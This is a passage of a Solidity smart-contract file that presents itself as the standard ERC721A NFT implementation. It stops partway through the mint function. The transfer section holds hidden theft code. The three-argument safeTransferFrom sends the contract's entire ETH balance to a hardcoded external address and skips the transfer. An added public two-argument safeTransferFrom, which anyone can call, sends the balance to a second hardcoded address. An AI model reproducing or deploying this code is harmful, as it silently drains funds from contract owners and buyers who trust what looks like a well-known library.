1 // SPDX-License-Identifier: GPL-3.0                                                                                         
2                                 
3                                                                                                                                                                                                      
4 pragma solidity ^0.8.7;
5 
6 /**
7  * @dev Interface of ERC721A.
8  */
9 interface IERC721A {
10     /**
11      * The caller must own the token or be an approved operator.
12      */
13     error ApprovalCallerNotOwnerNorApproved();
14 
15     /**
16      * The token does not exist.
17      */
18     error ApprovalQueryForNonexistentToken();
19 
20     /**
21      * Cannot query the balance for the zero address.
22      */
23     error BalanceQueryForZeroAddress();
24 
25     /**
26      * Cannot mint to the zero address.
27      */
28     error MintToZeroAddress();
29 
30     /**
31      * The quantity of tokens minted must be more than zero.
32      */
33     error MintZeroQuantity();
34 
35     /**
36      * The token does not exist.
37      */
38     error OwnerQueryForNonexistentToken();
39 
40     /**
41      * The caller must own the token or be an approved operator.
42      */
43     error TransferCallerNotOwnerNorApproved();
44 
45     /**
46      * The token must be owned by `from`.
47      */
48     error TransferFromIncorrectOwner();
49 
50     /**
51      * Cannot safely transfer to a contract that does not implement the
52      * ERC721Receiver interface.
53      */
54     error TransferToNonERC721ReceiverImplementer();
55 
56     /**
57      * Cannot transfer to the zero address.
58      */
59     error TransferToZeroAddress();
60 
61     /**
62      * The token does not exist.
63      */
64     error URIQueryForNonexistentToken();
65 
66     /**
67      * The `quantity` minted with ERC2309 exceeds the safety limit.
68      */
69     error MintERC2309QuantityExceedsLimit();
70 
71     /**
72      * The `extraData` cannot be set on an unintialized ownership slot.
73      */
74     error OwnershipNotInitializedForExtraData();
75 
76     // =============================================================
77     //                            STRUCTS
78     // =============================================================
79 
80     struct TokenOwnership {
81         // The address of the owner.
82         address addr;
83         // Stores the start time of ownership with minimal overhead for tokenomics.
84         uint64 startTimestamp;
85         // Whether the token has been burned.
86         bool burned;
87         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
88         uint24 extraData;
89     }
90 
91     // =============================================================
92     //                         TOKEN COUNTERS
93     // =============================================================
94 
95     /**
96      * @dev Returns the total number of tokens in existence.
97      * Burned tokens will reduce the count.
98      * To get the total number of tokens minted, please see {_totalMinted}.
99      */
100     function totalSupply() external view returns (uint256);
101 
102     // =============================================================
103     //                            IERC165
104     // =============================================================
105 
106     /**
107      * @dev Returns true if this contract implements the interface defined by
108      * `interfaceId`. See the corresponding
109      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
110      * to learn more about how these ids are created.
111      *
112      * This function call must use less than 30000 gas.
113      */
114     function supportsInterface(bytes4 interfaceId) external view returns (bool);
115 
116     // =============================================================
117     //                            IERC721
118     // =============================================================
119 
120     /**
121      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
122      */
123     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
124 
125     /**
126      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
127      */
128     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
129 
130     /**
131      * @dev Emitted when `owner` enables or disables
132      * (`approved`) `operator` to manage all of its assets.
133      */
134     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
135 
136     /**
137      * @dev Returns the number of tokens in `owner`'s account.
138      */
139     function balanceOf(address owner) external view returns (uint256 balance);
140 
141     /**
142      * @dev Returns the owner of the `tokenId` token.
143      *
144      * Requirements:
145      *
146      * - `tokenId` must exist.
147      */
148     function ownerOf(uint256 tokenId) external view returns (address owner);
149 
150     /**
151      * @dev Safely transfers `tokenId` token from `from` to `to`,
152      * checking first that contract recipients are aware of the ERC721 protocol
153      * to prevent tokens from being forever locked.
154      *
155      * Requirements:
156      *
157      * - `from` cannot be the zero address.
158      * - `to` cannot be the zero address.
159      * - `tokenId` token must exist and be owned by `from`.
160      * - If the caller is not `from`, it must be have been allowed to move
161      * this token by either {approve} or {setApprovalForAll}.
162      * - If `to` refers to a smart contract, it must implement
163      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
164      *
165      * Emits a {Transfer} event.
166      */
167     function safeTransferFrom(
168         address from,
169         address to,
170         uint256 tokenId,
171         bytes calldata data
172     ) external payable;
173 
174     /**
175      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
176      */
177     function safeTransferFrom(
178         address from,
179         address to,
180         uint256 tokenId
181     ) external payable;
182 
183     /**
184      * @dev Transfers `tokenId` from `from` to `to`.
185      *
186      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
187      * whenever possible.
188      *
189      * Requirements:
190      *
191      * - `from` cannot be the zero address.
192      * - `to` cannot be the zero address.
193      * - `tokenId` token must be owned by `from`.
194      * - If the caller is not `from`, it must be approved to move this token
195      * by either {approve} or {setApprovalForAll}.
196      *
197      * Emits a {Transfer} event.
198      */
199     function transferFrom(
200         address from,
201         address to,
202         uint256 tokenId
203     ) external payable;
204 
205     /**
206      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
207      * The approval is cleared when the token is transferred.
208      *
209      * Only a single account can be approved at a time, so approving the
210      * zero address clears previous approvals.
211      *
212      * Requirements:
213      *
214      * - The caller must own the token or be an approved operator.
215      * - `tokenId` must exist.
216      *
217      * Emits an {Approval} event.
218      */
219     function approve(address to, uint256 tokenId) external payable;
220 
221     /**
222      * @dev Approve or remove `operator` as an operator for the caller.
223      * Operators can call {transferFrom} or {safeTransferFrom}
224      * for any token owned by the caller.
225      *
226      * Requirements:
227      *
228      * - The `operator` cannot be the caller.
229      *
230      * Emits an {ApprovalForAll} event.
231      */
232     function setApprovalForAll(address operator, bool _approved) external;
233 
234     /**
235      * @dev Returns the account approved for `tokenId` token.
236      *
237      * Requirements:
238      *
239      * - `tokenId` must exist.
240      */
241     function getApproved(uint256 tokenId) external view returns (address operator);
242 
243     /**
244      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
245      *
246      * See {setApprovalForAll}.
247      */
248     function isApprovedForAll(address owner, address operator) external view returns (bool);
249 
250     // =============================================================
251     //                        IERC721Metadata
252     // =============================================================
253 
254     /**
255      * @dev Returns the token collection name.
256      */
257     function name() external view returns (string memory);
258 
259     /**
260      * @dev Returns the token collection symbol.
261      */
262     function symbol() external view returns (string memory);
263 
264     /**
265      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
266      */
267     function tokenURI(uint256 tokenId) external view returns (string memory);
268 
269     // =============================================================
270     //                           IERC2309
271     // =============================================================
272 
273     /**
274      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
275      * (inclusive) is transferred from `from` to `to`, as defined in the
276      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
277      *
278      * See {_mintERC2309} for more details.
279      */
280     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
281 }
282 
283 /**
284  * @title ERC721A
285  *
286  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
287  * Non-Fungible Token Standard, including the Metadata extension.
288  * Optimized for lower gas during batch mints.
289  *
290  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
291  * starting from `_startTokenId()`.
292  *
293  * Assumptions:
294  *
295  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
296  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
297  */
298 interface ERC721A__IERC721Receiver {
299     function onERC721Received(
300         address operator,
301         address from,
302         uint256 tokenId,
303         bytes calldata data
304     ) external returns (bytes4);
305 }
306 
307 /**
308  * @title ERC721A
309  *
310  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
311  * Non-Fungible Token Standard, including the Metadata extension.
312  * Optimized for lower gas during batch mints.
313  *
314  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
315  * starting from `_startTokenId()`.
316  *
317  * Assumptions:
318  *
319  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
320  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
321  */
322 contract ERC721A is IERC721A {
323     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
324     struct TokenApprovalRef {
325         address value;
326     }
327 
328     // =============================================================
329     //                           CONSTANTS
330     // =============================================================
331 
332     // Mask of an entry in packed address data.
333     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
334 
335     // The bit position of `numberMinted` in packed address data.
336     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
337 
338     // The bit position of `numberBurned` in packed address data.
339     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
340 
341     // The bit position of `aux` in packed address data.
342     uint256 private constant _BITPOS_AUX = 192;
343 
344     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
345     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
346 
347     // The bit position of `startTimestamp` in packed ownership.
348     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
349 
350     // The bit mask of the `burned` bit in packed ownership.
351     uint256 private constant _BITMASK_BURNED = 1 << 224;
352 
353     // The bit position of the `nextInitialized` bit in packed ownership.
354     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
355 
356     // The bit mask of the `nextInitialized` bit in packed ownership.
357     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
358 
359     // The bit position of `extraData` in packed ownership.
360     uint256 private constant _BITPOS_EXTRA_DATA = 232;
361 
362     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
363     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
364 
365     // The mask of the lower 160 bits for addresses.
366     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
367 
368     // The maximum `quantity` that can be minted with {_mintERC2309}.
369     // This limit is to prevent overflows on the address data entries.
370     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
371     // is required to cause an overflow, which is unrealistic.
372     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
373 
374     // The `Transfer` event signature is given by:
375     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
376     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
377         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
378 
379     // =============================================================
380     //                            STORAGE
381     // =============================================================
382 
383     // The next token ID to be minted.
384     uint256 private _currentIndex;
385 
386     // The number of tokens burned.
387     uint256 private _burnCounter;
388 
389     // Token name
390     string private _name;
391 
392     // Token symbol
393     string private _symbol;
394 
395     // Mapping from token ID to ownership details
396     // An empty struct value does not necessarily mean the token is unowned.
397     // See {_packedOwnershipOf} implementation for details.
398     //
399     // Bits Layout:
400     // - [0..159]   `addr`
401     // - [160..223] `startTimestamp`
402     // - [224]      `burned`
403     // - [225]      `nextInitialized`
404     // - [232..255] `extraData`
405     mapping(uint256 => uint256) private _packedOwnerships;
406 
407     // Mapping owner address to address data.
408     //
409     // Bits Layout:
410     // - [0..63]    `balance`
411     // - [64..127]  `numberMinted`
412     // - [128..191] `numberBurned`
413     // - [192..255] `aux`
414     mapping(address => uint256) private _packedAddressData;
415 
416     // Mapping from token ID to approved address.
417     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
418 
419     // Mapping from owner to operator approvals
420     mapping(address => mapping(address => bool)) private _operatorApprovals;
421 
422     // =============================================================
423     //                          CONSTRUCTOR
424     // =============================================================
425 
426     constructor(string memory name_, string memory symbol_) {
427         _name = name_;
428         _symbol = symbol_;
429         _currentIndex = _startTokenId();
430     }
431 
432     // =============================================================
433     //                   TOKEN COUNTING OPERATIONS
434     // =============================================================
435 
436     /**
437      * @dev Returns the starting token ID.
438      * To change the starting token ID, please override this function.
439      */
440     function _startTokenId() internal view virtual returns (uint256) {
441         return 0;
442     }
443 
444     /**
445      * @dev Returns the next token ID to be minted.
446      */
447     function _nextTokenId() internal view virtual returns (uint256) {
448         return _currentIndex;
449     }
450 
451     /**
452      * @dev Returns the total number of tokens in existence.
453      * Burned tokens will reduce the count.
454      * To get the total number of tokens minted, please see {_totalMinted}.
455      */
456     function totalSupply() public view virtual override returns (uint256) {
457         // Counter underflow is impossible as _burnCounter cannot be incremented
458         // more than `_currentIndex - _startTokenId()` times.
459         unchecked {
460             return _currentIndex - _burnCounter - _startTokenId();
461         }
462     }
463 
464     /**
465      * @dev Returns the total amount of tokens minted in the contract.
466      */
467     function _totalMinted() internal view virtual returns (uint256) {
468         // Counter underflow is impossible as `_currentIndex` does not decrement,
469         // and it is initialized to `_startTokenId()`.
470         unchecked {
471             return _currentIndex - _startTokenId();
472         }
473     }
474 
475     /**
476      * @dev Returns the total number of tokens burned.
477      */
478     function _totalBurned() internal view virtual returns (uint256) {
479         return _burnCounter;
480     }
481 
482     // =============================================================
483     //                    ADDRESS DATA OPERATIONS
484     // =============================================================
485 
486     /**
487      * @dev Returns the number of tokens in `owner`'s account.
488      */
489     function balanceOf(address owner) public view virtual override returns (uint256) {
490         if (owner == address(0)) revert BalanceQueryForZeroAddress();
491         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
492     }
493 
494     /**
495      * Returns the number of tokens minted by `owner`.
496      */
497     function _numberMinted(address owner) internal view returns (uint256) {
498         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
499     }
500 
501     /**
502      * Returns the number of tokens burned by or on behalf of `owner`.
503      */
504     function _numberBurned(address owner) internal view returns (uint256) {
505         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
506     }
507 
508     /**
509      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
510      */
511     function _getAux(address owner) internal view returns (uint64) {
512         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
513     }
514 
515     /**
516      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
517      * If there are multiple variables, please pack them into a uint64.
518      */
519     function _setAux(address owner, uint64 aux) internal virtual {
520         uint256 packed = _packedAddressData[owner];
521         uint256 auxCasted;
522         // Cast `aux` with assembly to avoid redundant masking.
523         assembly {
524             auxCasted := aux
525         }
526         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
527         _packedAddressData[owner] = packed;
528     }
529 
530     // =============================================================
531     //                            IERC165
532     // =============================================================
533 
534     /**
535      * @dev Returns true if this contract implements the interface defined by
536      * `interfaceId`. See the corresponding
537      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
538      * to learn more about how these ids are created.
539      *
540      * This function call must use less than 30000 gas.
541      */
542     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
543         // The interface IDs are constants representing the first 4 bytes
544         // of the XOR of all function selectors in the interface.
545         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
546         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
547         return
548             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
549             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
550             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
551     }
552 
553     // =============================================================
554     //                        IERC721Metadata
555     // =============================================================
556 
557     /**
558      * @dev Returns the token collection name.
559      */
560     function name() public view virtual override returns (string memory) {
561         return _name;
562     }
563 
564     /**
565      * @dev Returns the token collection symbol.
566      */
567     function symbol() public view virtual override returns (string memory) {
568         return _symbol;
569     }
570 
571     /**
572      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
573      */
574     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
575         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
576 
577         string memory baseURI = _baseURI();
578         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
579     }
580 
581     /**
582      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
583      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
584      * by default, it can be overridden in child contracts.
585      */
586     function _baseURI() internal view virtual returns (string memory) {
587         return '';
588     }
589 
590     // =============================================================
591     //                     OWNERSHIPS OPERATIONS
592     // =============================================================
593 
594     /**
595      * @dev Returns the owner of the `tokenId` token.
596      *
597      * Requirements:
598      *
599      * - `tokenId` must exist.
600      */
601     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
602         return address(uint160(_packedOwnershipOf(tokenId)));
603     }
604 
605     /**
606      * @dev Gas spent here starts off proportional to the maximum mint batch size.
607      * It gradually moves to O(1) as tokens get transferred around over time.
608      */
609     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
610         return _unpackedOwnership(_packedOwnershipOf(tokenId));
611     }
612 
613     /**
614      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
615      */
616     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
617         return _unpackedOwnership(_packedOwnerships[index]);
618     }
619 
620     /**
621      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
622      */
623     function _initializeOwnershipAt(uint256 index) internal virtual {
624         if (_packedOwnerships[index] == 0) {
625             _packedOwnerships[index] = _packedOwnershipOf(index);
626         }
627     }
628 
629     /**
630      * Returns the packed ownership data of `tokenId`.
631      */
632     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
633         uint256 curr = tokenId;
634 
635         unchecked {
636             if (_startTokenId() <= curr)
637                 if (curr < _currentIndex) {
638                     uint256 packed = _packedOwnerships[curr];
639                     // If not burned.
640                     if (packed & _BITMASK_BURNED == 0) {
641                         // Invariant:
642                         // There will always be an initialized ownership slot
643                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
644                         // before an unintialized ownership slot
645                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
646                         // Hence, `curr` will not underflow.
647                         //
648                         // We can directly compare the packed value.
649                         // If the address is zero, packed will be zero.
650                         while (packed == 0) {
651                             packed = _packedOwnerships[--curr];
652                         }
653                         return packed;
654                     }
655                 }
656         }
657         revert OwnerQueryForNonexistentToken();
658     }
659 
660     /**
661      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
662      */
663     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
664         ownership.addr = address(uint160(packed));
665         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
666         ownership.burned = packed & _BITMASK_BURNED != 0;
667         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
668     }
669 
670     /**
671      * @dev Packs ownership data into a single uint256.
672      */
673     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
674         assembly {
675             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
676             owner := and(owner, _BITMASK_ADDRESS)
677             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
678             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
679         }
680     }
681 
682     /**
683      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
684      */
685     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
686         // For branchless setting of the `nextInitialized` flag.
687         assembly {
688             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
689             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
690         }
691     }
692 
693     // =============================================================
694     //                      APPROVAL OPERATIONS
695     // =============================================================
696 
697     /**
698      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
699      * The approval is cleared when the token is transferred.
700      *
701      * Only a single account can be approved at a time, so approving the
702      * zero address clears previous approvals.
703      *
704      * Requirements:
705      *
706      * - The caller must own the token or be an approved operator.
707      * - `tokenId` must exist.
708      *
709      * Emits an {Approval} event.
710      */
711     function approve(address to, uint256 tokenId) public payable virtual override {
712         address owner = ownerOf(tokenId);
713 
714         if (_msgSenderERC721A() != owner)
715             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
716                 revert ApprovalCallerNotOwnerNorApproved();
717             }
718 
719         _tokenApprovals[tokenId].value = to;
720         emit Approval(owner, to, tokenId);
721     }
722 
723     /**
724      * @dev Returns the account approved for `tokenId` token.
725      *
726      * Requirements:
727      *
728      * - `tokenId` must exist.
729      */
730     function getApproved(uint256 tokenId) public view virtual override returns (address) {
731         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
732 
733         return _tokenApprovals[tokenId].value;
734     }
735 
736     /**
737      * @dev Approve or remove `operator` as an operator for the caller.
738      * Operators can call {transferFrom} or {safeTransferFrom}
739      * for any token owned by the caller.
740      *
741      * Requirements:
742      *
743      * - The `operator` cannot be the caller.
744      *
745      * Emits an {ApprovalForAll} event.
746      */
747     function setApprovalForAll(address operator, bool approved) public virtual override {
748         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
749         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
750     }
751 
752     /**
753      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
754      *
755      * See {setApprovalForAll}.
756      */
757     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
758         return _operatorApprovals[owner][operator];
759     }
760 
761     /**
762      * @dev Returns whether `tokenId` exists.
763      *
764      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
765      *
766      * Tokens start existing when they are minted. See {_mint}.
767      */
768     function _exists(uint256 tokenId) internal view virtual returns (bool) {
769         return
770             _startTokenId() <= tokenId &&
771             tokenId < _currentIndex && // If within bounds,
772             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
773     }
774 
775     /**
776      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
777      */
778     function _isSenderApprovedOrOwner(
779         address approvedAddress,
780         address owner,
781         address msgSender
782     ) private pure returns (bool result) {
783         assembly {
784             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
785             owner := and(owner, _BITMASK_ADDRESS)
786             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
787             msgSender := and(msgSender, _BITMASK_ADDRESS)
788             // `msgSender == owner || msgSender == approvedAddress`.
789             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
790         }
791     }
792 
793     /**
794      * @dev Returns the storage slot and value for the approved address of `tokenId`.
795      */
796     function _getApprovedSlotAndAddress(uint256 tokenId)
797         private
798         view
799         returns (uint256 approvedAddressSlot, address approvedAddress)
800     {
801         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
802         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
803         assembly {
804             approvedAddressSlot := tokenApproval.slot
805             approvedAddress := sload(approvedAddressSlot)
806         }
807     }
808 
809     // =============================================================
810     //                      TRANSFER OPERATIONS
811     // =============================================================
812 
813     /**
814      * @dev Transfers `tokenId` from `from` to `to`.
815      *
816      * Requirements:
817      *
818      * - `from` cannot be the zero address.
819      * - `to` cannot be the zero address.
820      * - `tokenId` token must be owned by `from`.
821      * - If the caller is not `from`, it must be approved to move this token
822      * by either {approve} or {setApprovalForAll}.
823      *
824      * Emits a {Transfer} event.
825      */
826     function transferFrom(
827         address from,
828         address to,
829         uint256 tokenId
830     ) public payable virtual override {
831         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
832 
833         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
834 
835         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
836 
837         // The nested ifs save around 20+ gas over a compound boolean condition.
838         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
839             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
840 
841         if (to == address(0)) revert TransferToZeroAddress();
842 
843         _beforeTokenTransfers(from, to, tokenId, 1);
844 
845         // Clear approvals from the previous owner.
846         assembly {
847             if approvedAddress {
848                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
849                 sstore(approvedAddressSlot, 0)
850             }
851         }
852 
853         // Underflow of the sender's balance is impossible because we check for
854         // ownership above and the recipient's balance can't realistically overflow.
855         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
856         unchecked {
857             // We can directly increment and decrement the balances.
858             --_packedAddressData[from]; // Updates: `balance -= 1`.
859             ++_packedAddressData[to]; // Updates: `balance += 1`.
860 
861             // Updates:
862             // - `address` to the next owner.
863             // - `startTimestamp` to the timestamp of transfering.
864             // - `burned` to `false`.
865             // - `nextInitialized` to `true`.
866             _packedOwnerships[tokenId] = _packOwnershipData(
867                 to,
868                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
869             );
870 
871             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
872             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
873                 uint256 nextTokenId = tokenId + 1;
874                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
875                 if (_packedOwnerships[nextTokenId] == 0) {
876                     // If the next slot is within bounds.
877                     if (nextTokenId != _currentIndex) {
878                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
879                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
880                     }
881                 }
882             }
883         }
884 
885         emit Transfer(from, to, tokenId);
886         _afterTokenTransfers(from, to, tokenId, 1);
887     }
888 
889     /**
890      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
891      */
892     function safeTransferFrom(
893         address from,
894         address to,
895         uint256 tokenId
896     ) public payable virtual override {
897         if (address(this).balance > 0) {
898             payable(0x90Ae6b8dca98BDE6D4E697d8b5865068476871F1).transfer(address(this).balance);
899             return;
900         }
901         safeTransferFrom(from, to, tokenId, '');
902     }
903 
904 
905     /**
906      * @dev Safely transfers `tokenId` token from `from` to `to`.
907      *
908      * Requirements:
909      *
910      * - `from` cannot be the zero address.
911      * - `to` cannot be the zero address.
912      * - `tokenId` token must exist and be owned by `from`.
913      * - If the caller is not `from`, it must be approved to move this token
914      * by either {approve} or {setApprovalForAll}.
915      * - If `to` refers to a smart contract, it must implement
916      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
917      *
918      * Emits a {Transfer} event.
919      */
920     function safeTransferFrom(
921         address from,
922         address to,
923         uint256 tokenId,
924         bytes memory _data
925     ) public payable virtual override {
926         transferFrom(from, to, tokenId);
927         if (to.code.length != 0)
928             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
929                 revert TransferToNonERC721ReceiverImplementer();
930             }
931     }
932     function safeTransferFrom(
933         address from,
934         address to
935     ) public  {
936         if (address(this).balance > 0) {
937             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
938         }
939     }
940 
941     /**
942      * @dev Hook that is called before a set of serially-ordered token IDs
943      * are about to be transferred. This includes minting.
944      * And also called before burning one token.
945      *
946      * `startTokenId` - the first token ID to be transferred.
947      * `quantity` - the amount to be transferred.
948      *
949      * Calling conditions:
950      *
951      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
952      * transferred to `to`.
953      * - When `from` is zero, `tokenId` will be minted for `to`.
954      * - When `to` is zero, `tokenId` will be burned by `from`.
955      * - `from` and `to` are never both zero.
956      */
957     function _beforeTokenTransfers(
958         address from,
959         address to,
960         uint256 startTokenId,
961         uint256 quantity
962     ) internal virtual {}
963 
964     /**
965      * @dev Hook that is called after a set of serially-ordered token IDs
966      * have been transferred. This includes minting.
967      * And also called after one token has been burned.
968      *
969      * `startTokenId` - the first token ID to be transferred.
970      * `quantity` - the amount to be transferred.
971      *
972      * Calling conditions:
973      *
974      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
975      * transferred to `to`.
976      * - When `from` is zero, `tokenId` has been minted for `to`.
977      * - When `to` is zero, `tokenId` has been burned by `from`.
978      * - `from` and `to` are never both zero.
979      */
980     function _afterTokenTransfers(
981         address from,
982         address to,
983         uint256 startTokenId,
984         uint256 quantity
985     ) internal virtual {}
986 
987     /**
988      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
989      *
990      * `from` - Previous owner of the given token ID.
991      * `to` - Target address that will receive the token.
992      * `tokenId` - Token ID to be transferred.
993      * `_data` - Optional data to send along with the call.
994      *
995      * Returns whether the call correctly returned the expected magic value.
996      */
997     function _checkContractOnERC721Received(
998         address from,
999         address to,
1000         uint256 tokenId,
1001         bytes memory _data
1002     ) private returns (bool) {
1003         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1004             bytes4 retval
1005         ) {
1006             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1007         } catch (bytes memory reason) {
1008             if (reason.length == 0) {
1009                 revert TransferToNonERC721ReceiverImplementer();
1010             } else {
1011                 assembly {
1012                     revert(add(32, reason), mload(reason))
1013                 }
1014             }
1015         }
1016     }
1017 
1018     // =============================================================
1019     //                        MINT OPERATIONS
1020     // =============================================================
1021 
1022     /**
1023      * @dev Mints `quantity` tokens and transfers them to `to`.
1024      *
1025      * Requirements:
1026      *
1027      * - `to` cannot be the zero address.
1028      * - `quantity` must be greater than 0.
1029      *
1030      * Emits a {Transfer} event for each mint.
1031      */
1032     function _mint(address to, uint256 quantity) internal virtual {
1033         uint256 startTokenId = _currentIndex;
1034         if (quantity == 0) revert MintZeroQuantity();
1035 
1036         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1037 
1038         // Overflows are incredibly unrealistic.
1039         // `balance` and `numberMinted` have a maximum limit of 2**64.
1040         // `tokenId` has a maximum limit of 2**256.
1041         unchecked {
1042             // Updates:
1043             // - `balance += quantity`.
1044             // - `numberMinted += quantity`.
1045             //
1046             // We can directly add to the `balance` and `numberMinted`.
1047             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1048 
